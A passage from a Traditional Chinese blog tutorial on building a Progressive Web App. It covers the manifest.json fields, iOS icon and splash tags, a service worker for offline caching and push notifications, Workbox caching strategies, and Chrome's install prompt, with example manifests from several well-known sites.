\u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } Step4：html 加入 manifest.json 在head標籤中加入 manifest.json。\n1 2 3 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; 由於 manifest 在 IOS 上還不支援，因此如果 IOS 上也想要自訂 icon，就要改用 HTML 裡的 meta 來設定，如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;./apple-touch-icon-57x57.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;./apple-touch-icon-114x114.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;120x120\u0026#34; href=\u0026#34;./apple-touch-icon-120x120.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;180x180\u0026#34; href=\u0026#34;./apple-touch-icon-180x180.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;192x192\u0026#34; href=\u0026#34;./apple-touch-icon-192x192.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;512x512\u0026#34; href=\u0026#34;./apple-touch-icon-512x512.png\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; Step5：打開開發人員工具檢查 manifest.json 的設定 Step6：加入 serviceWorker 語法 更多 Service Worker 介紹，點我前往\n在網頁前加入下方的語法。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; if (\u0026#34;serviceWorker\u0026#34; in navigator) { console.log(\u0026#34;Will service worker register?\u0026#34;); navigator.serviceWorker.register(\u0026#34;./service-worker.js\u0026#34;).then(function(reg) { console.log(\u0026#34;Yes it did.\u0026#34;); }).catch(function(err) { console.log(\u0026#34;No, it didn\u0026#39;t. This happened: \u0026#34;, err); }); } \u0026lt;/script\u0026gt; Step7：建立 service-worker.js 檔案 接著再建立一個文件，並貼上下方的語法，儲存為 service-worker.js，這時可看到在原來的網頁中，分別會多了 manifest.json 與 service-worker.js 和圖片資料夾。\nservice-worker.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 self.addEventListener(\u0026#39;install\u0026#39;, function(event) { self.skipWaiting(); var offlinePage = new Request(\u0026#39;offline.html\u0026#39;); event.waitUntil( fetch(offlinePage).then(function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); })); }); self.addEventListener(\u0026#39;fetch\u0026#39;, function(event) { event.respondWith( fetch(event.request).catch(function(error) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.match(\u0026#39;offline.html\u0026#39;); }); })); }); self.addEventListener(\u0026#39;refreshOffline\u0026#39;, function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); }); self.addEventListener(\u0026#39;push\u0026#39;, function (event) { var data = event.data.json(); var opts = { body: data.body, icon: data.icon, data: { url: data.url } }; event.waitUntil(self.registration.showNotification(data.title, opts)); }); self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var data = event.notification.data; event.notification.close(); event.waitUntil( clients.openWindow(data.url) ); }); Step8：確認 Service Workers 是否正常 接著再回到網頁的「開發人員工具」的 Service Workers 時，就會看到綠色燈號。\nStep9：安裝「頁面」 都完成後，再點 Chrome 右上的選單圖示，就可看到「安裝XXX」。\nStep10：安裝 點一下，就會出現安裝畫面，再點「安裝」。\n當安裝完畢後，就會開啟剛所安裝的應用程式，哈！是不是畫面乾淨許多，就像在使用一般的應用程式一樣，有了PWA後可實現透過網頁就能打造專屬的應用程式的夢想，且完全不用再學新語言，真是超方便的。\nmanifest.json 介紹 以下來說明一下 manifest.json\nmanifest.json 是在學 PWA 這塊時最簡單的部份，主要是建一支 JSON 檔就可以，相關的參數 MDN上 或是 Google 一下就會看到，不用花太多的時間去記。\nmanifest.json是做什麼用的？ 根據 MDN 上的解釋，manifest.json 是這樣子的：\n它提供了應用程式相關的資訊（像是名稱、作者、圖示、描述）。 manifest 的功用是將 Web 應用程式安裝到設備的主畫面，為使用者提供更快速的訪問和更豐富的體驗。\n簡單的說明就是，PWA 主要就是讓網頁可以模擬成一個手機的 App 來使用，要當成 App，就要有 App 的樣子，就要能在手機的桌面上有一個 icon 可以按，按下去後有一個幾秒鐘的啟動畫面讓使用者知道開啟的 App 是什麼，manifest 就是在處理這段。\n另外，一般我們在手機上開 Chrome 或 Safari 看網頁時，最頂部會有一條網址列，但一般 App 是不會有的，而 manifest.json 也可以設定開啟頁面時不顯示網址列。\nPWA 是把頁面模擬成 App 的一個方法，如果公司本身也有製作 App 呢？manifest.json 上也可以設定 App 在 Google Play、App Store 上的連結，並呈現一個推薦通知讓使用者可以進入並下載。\n最後補充一點，不論是 PWA 的 Cache 或是推播功能，都要求網站要是 https，manifest.json 這點也不意外，如果網站不是 https，即便引用了 manifest.json，也不會被 Chrome 主動詢問是否要將網站加入到主畫面。\n關於 manifest 的功能，Google 有一隻影片介紹：\nWeb App Manifest: Totally Tooling Tips\nmanifest.json 成員 成員列表整理如下：\n欄位 說明 theme_color 應用程式的主要顏色 background_color 啟動畫面（splash screen）的背景色 icons 應用程式的圖示 name 應用程式的名稱 short_name 應用程式的簡寫 lang 主要語言 description 應用程式的描述 dir 文字書寫方向 display 應用程式的顯示模式 orientation 預設顯示的方向是直的或橫的 prefer_related_applications 是否要推薦一個原生的 App related_applications 推薦原生 App 的連結 start_url 開啟應用程式時的預設網址 scope 應用程式的使用範圍 theme_color 應用程式的主要顏色，主要可以改變網址列那一條的顏色。\n1 \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34; background_color 啟動畫面（splash screen）的背景色，App 啟動時，會有一個 Splash Screen，翻譯成快閃頁、過場頁，本篇稱為啟動畫面。\nSplash Screen 需要3個成員：background_color、icons、name。\n1 \u0026#34;background_color\u0026#34;: \u0026#34;red\u0026#34; 補充一點，Splash Screen，在 IOS 上是不支援的，但可以直接讀取一張圖檔來當作啟動頁面，在 head 裡加入以下就行：\n1 2 3 4 5 6 7 \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-640x1136.png\u0026#34; media=\u0026#34;(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-750x1294.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1125x2436.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1242x2148.png\u0026#34; media=\u0026#34;(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1536x2048.png\u0026#34; media=\u0026#34;(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1668x2224.png\u0026#34; media=\u0026#34;(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-2048x2732.png\u0026#34; media=\u0026#34;(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; icons 應用程式的圖示，icons 裡放陣列，放不同尺寸下的主要圖示，如果 Splash Screen 裡要用的圖示，大小必須包含 192px、512px。\nicons 裡，陣列裡的每一個物件有 3 個成員：\nsizes 圖片尺寸，可用在多個尺寸上的話用空白鍵區隔。 src 圖片的路徑，如果是相對路徑，是以 manifest 所在的位置為基準。 type 圖檔類型，這項排必填，主要是告知裝置類型，讓不支援的裝置可以快速略過。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.ico\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72 96x96 128x128 256x256\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.svg\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72\u0026#34; } ] 由於 manifest 在 IOS 上還不支援，因此如果 IOS 上也想要自訂 icon，就要改用 HTML 裡的 meta 來設定，如下：\n1 2 3 \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;apple-icon-57x57.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;72x72\u0026#34; href=\u0026#34;apple-icon-72x72.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;apple-icon-114x114.png\u0026#34; /\u0026gt; name 應用程式的完整名稱，會顯示在 Splash Screen上，以及主畫面上的名稱。\n1 \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; short_name 應用程式的簡寫，當 name 太長而無法顯示時，會改成顯示簡寫。\n1 \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; lang 主要語言，針對 name、short_name 這兩個使用的。\n語言列表可以在這找：https://www.iana.org\n1 \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34; description 應用程式的描述，描述這個應用程式是做什麼的。\n1 \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34; dir 文字書寫方向，值有 3 個：ltr（左至右）、rtl（右至左）、auto（讓瀏覽器自己決定），不填的話預設值是 auto。\n1 \u0026#34;dir\u0026#34;: \u0026#34;ltr\u0026#34; display 應用程式的顯示模式，顯示模式指的是從主畫面點開 App 後，要顯示的樣子，有 4 個值可用：\nfullscreen： 全螢幕，就像在用原生 App 一樣，會隱藏所有的瀏覽器 UI。 standalone： 會隱藏標準瀏覽器 UI 元素，如 URL 欄等。 browser： 預設值，就像一般用瀏覽器一樣。 minimal： ui 會有導覽列最小的 UI，這個值 Chrome 不支援。 如果要 Chrome 主動提示加入主畫面的話，設定值必須要是 standalone。\n1 \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34; orientation 預設顯示的方向是直的或橫的，可以強制讓使用者必須裝置拿直的（landscape）或拿橫的（portrait）看。這點要設要仔細思考過才行，因為使用都大部份都喜歡自己決定是直看或横看。\n如果是遊戲類型的，可以設定用橫的。\n1 \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34; prefer_related_applications 是否要推薦一個原生的 App，PWA 是模擬頁面為 App，如果網站本身有出 App，這項就可以設成 true，從主畫面點開頁面時就會出現可以下載 App 的提示。\n如果這項為 true，則下面的 related_applications 就要填入值；這項的預設值為 false。\n1 \u0026#34;prefer_related_applications\u0026#34;: false related_applications 推薦原生 App 的連結，值是陣列，裡面放 App 資訊的物件，每項物件有 2 個成員要填，是 Google Play 上的話則有 3 個成員。\nplatform： 應用程式的平台，可填 play、itunes。 url： 應用程式的網址。 id： Google Play上要填的 ID。 1 2 3 4 5 6 7 8 9 10 11 \u0026#34;related_applications\u0026#34;: [ { \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://play.google.com/store/apps/details?id=com.example.app1\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.example.app1\u0026#34; }, { \u0026#34;platform\u0026#34;: \u0026#34;itunes\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://itunes.apple.com/app/example-app1/id123456789\u0026#34; } ] start_url 開啟應用程式時的預設網址，如果有設定的話，開啟應用程式時就會進到設定的網址。沒設定的話就是使用者按加入主畫面時的那個網址。\n如果填寫的是相對路徑，是以 manifest 所在的位置為基準。\n建議可以在網址上加入 Google Analytics 的 utm 參數，這樣在 GA 上就可以看見多少來源是來自於 PWA，可以檢測成效。\n如果要 Chrome 主動提示加入主畫面的話，這項必須填寫。\n1 \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34; scope 應用程式的使用範圍，這項如果有填，那應用程式的作用域就會限在指定的目錄裡，超過指定目錄，就會當成一般的網頁瀏覽。\n1 \u0026#34;scope\u0026#34;: \u0026#34;/myapp/\u0026#34; manifest.json 基本檔案內容 manifest 裡的成員不是每項都一定要填寫的，以下附上 manifest.json 的基本檔內容：\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } 關於「Chrome 主動提示加入主畫面」 PWA 身為 Google 的親身兒子，在 Android 手機是很有吃香的點。\n頁面引用了 manifest.json 後，使用者在手機上點選加入主畫面，頁面就可以像 App 一樣顯示在手機的主畫面上。\n但很多使用者其實不知道有這功能，或是知道了也不常會去按。\n貼心的 Google 針對這點做了一項措施，就是主動詢問使用者要不要將頁面加入主畫面。\n根據 Google 的說明文件：Add to Home Screen，觸發 Chrome 主動詢問是否加入主畫面的條件如下：\n使用者還沒加入主畫面 在有 manifes.json 的網域下，互動了至少 30 秒 manifset.json 裡有幾項成員一定要有：name 或 short_name、icons、start_url、display 頁面要是 https 頁面有裝 service-worker（sw.js），裡面有監聽並處理 beforeinstallprompt 事件 第 5 點，是否要有寫 beforeinstallprompt，好像不是必填項目，即便沒填，在測試時也會在底部出現一條詢問框。\n在參考了這篇以後：PWA 實戰經驗分享\n發現別人是用在 UX 上更優化的地方，就是自己選擇要出現詢問框時用的。\nmanifest 觀摩 我們來看看幾個知名的 PWA 都是怎麼寫他們的 manifest.json。\n第一個是 PWA 界中很有名的 flipkart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https:/https://static.coderbridge.com/img/techbridge/images1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;656085505957\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;start_url\u0026#34;: \u0026#34;/?start_url=homescreenicon\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;gcm\u0026#34; ], \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#2874f0\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#2874f0\u0026#34; } 再來是鼎鼎大名的 twitter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;It\u0026#39;s what\u0026#39;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;49625052041\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;share_target\u0026#34;: { \u0026#34;action\u0026#34;: \u0026#34;compose/tweet\u0026#34;, \u0026#34;params\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;url\u0026#34; } }, \u0026#34;short_name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34; } 最後則是 Google I/O 2018：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 { \u0026#34;name\u0026#34;: \u0026#34;Google I/O 2018\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;I/O 2018\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;icons\u0026#34;: [{ \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen57.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen114.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen128.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;128x128\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen144.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;144x144\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen192.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }], \u0026#34;prefer_related_applications\u0026#34;: false, \u0026#34;related_applications\u0026#34;: [{ \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.google.samples.apps.iosched\u0026#34; }], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } 我滿喜歡觀察別人家的這些東西，因為你會發現很多你查資料時遺漏或是根本找不到的資訊，而且這些看久了你也會有個概念，知道哪些屬性特別常用，除了 manifest.json 以外，也可以參考 html 裡面的 tag，一樣能學習到很多。\nService Worker 介紹 加入 Service Worker 的目的就只有一個，那就是快取。透過 Service Worker（以下簡稱 SW），可以幫助我們在發送 request 之前就先攔截到並且做處理，而離線運行的原理也是這樣的，我們先在第一次開啟時註冊 SW，並且利用 SW 下載靜態檔案並快取住，之後若使用者離線，我們再用已經快取住的檔案來回覆，就不會發送真的 request，自然也不會發生無法連線的情況。\n而 Google 有提供了一個方便的工具：Workbox 來幫助我們自動產生出 SW 以及利用更方便的語法來攔截 request。\n舉例來說，我自己用的是 Webpack 的 plugin：\n1 2 3 4 5 6 7 8 9 10 new workboxPlugin.InjectManifest({ swSrc: path.join(__dirname, \u0026#39;..\u0026#39;, SRC_DIR, \u0026#39;sw.js\u0026#39;), swDest: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR, \u0026#39;sw.js\u0026#39;), globDirectory: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR), globPatterns: [\u0026#39;**/*.{js,css}\u0026#39;] }), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) 只要這樣一寫，就會自動去找符合規則的檔案並且加入快取清單裡面，你只要一註冊 SW 的時候就會把那些檔案給快取起來。\n除此之外呢，Workbox 也可以針對 URL 來監聽：\nsw.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args =\u0026gt; workbox.strategies .networkFirst({ cacheName: \u0026#39;data-cache\u0026#39;, plugins: [ new workbox.expiration.Plugin({ maxEntries: 100, maxAgeSeconds: 2592000 }) ] }) .handle(args) .then(response =\u0026gt; { return response }) .catch(err =\u0026gt; { console.log(\u0026#39;err:\u0026#39;, err) }) ) 像上面的程式碼就是針對路徑中含有 api 的 request 做快取，這樣在離線時也可以利用以前快取住的 API response。\nWorkbox 針對這種動態的快取提供幾種策略，分別是：staleWhileRevalidate、cacheFirst、networkFirst、networkOnly與cacheOnly，其實看名字就可以大概理解策略是什麼了，想知道詳細的內容可以參考官方文件：Workbox Strategies。\n總之自從有了 Workbox 之後，基本上就不用自己手寫 SW 了，都靠著它提供的 API 以及功能就行了，就可以自動產生出符合需求的 SW。\nAdd to home screen banner 最後要來談的是「安裝 PWA」這一塊，在 iOS Safari 上面別無他法，就只能自己叫出選單然後選取「Add to home screen」，可是在 Android Chrome 上面，如果你符合一定的條件（有設置 mainfest.json 以及有註冊 Service Worker），就會自動幫你跳出一個可愛的 Install banner。\n（圖片來自：Changes to Add to Home Screen Behavior）\n根據 Chrome 版本的不同，行為也有所不同。\n在 Chrome 67（含）以前的版本，如果你在 beforeinstallprompt 事件裡面沒有特別用 preventDefault()，或是顯式的呼叫了 prompt()，就會出現最左邊那個頗大的 A2HS banner。\n然後在 Chrome 68（含）之後的版本，無論你做了什麼，系統都會自動出現那個 Mini-infobar，但如果使用者關掉的話，要隔三個月才會再出現一次，實在是有夠久。\n接著呢，上面這兩個 A2HS banner 跟 Mini-infobar，使用者點擊之後都會出現最右邊的 A2HS Dialog，提示使用者要不要安裝 PWA。\n但是在 Chrome 68 以後，你也可以利用程式去呼叫 beforeinstallprompt 裡面拿到的 event.prompt() 把這個 dialog 顯示出來。\n聽起來有點複雜對吧？\n先來介紹 beforeinstallprompt 這個 event 好了，這個 event 在一切都準備就緒，確認你滿足條件可以顯示 prompt 的時候會被觸發，會傳來一個 event，你可以阻止顯示 prompt，把這個 event 存起來：\n1 2 3 4 5 6 7 8 9 10 11 // 此範例來自上面的官方文件 let installPromptEvent; window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, (event) =\u0026gt; { // Prevent Chrome \u0026lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector(\u0026#39;#install-button\u0026#39;).disabled = false; }); 為什麼要存起來呢？因為使用者可能不想一打開網站就看到這個彈窗，或者他可能正在結帳結果你跳這個東西來干擾他，所以先把它存起來，等適當的時機再呼叫 installPromptEvent.prompt() 來跳出 Dialog。\n但要注意的事情是你直接呼叫 installPromptEvent.prompt() 是沒用的，你必須要 within a user gesture，意思就是你要放在按鈕的 click 事件（或其他由使用者觸發的事件）裡才有效，直接呼叫是沒有用的，而且會看到 console 跳出錯誤訊息。\n我之前一度很好奇它是怎麼做判斷的，後來發現原來有 event.isTrusted 可以用，可以判斷一個事件是不是被使用者主動觸發的，參考資料：MDN - Event.isTrusted。\n總之呢，因為在不同版本上的 Chrome 有不同行為，所以最後我們決定用下面的程式碼針對不同版本有不同的反應：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 把 event 存起來 var installPromptEvent // 要顯示 prompt 的延遲 var showTime = 30 * 1000 window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, function (e) { e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data \u0026amp;\u0026amp; data.length \u0026gt;= 2) ? parseInt(data[2], 10) : null if (version 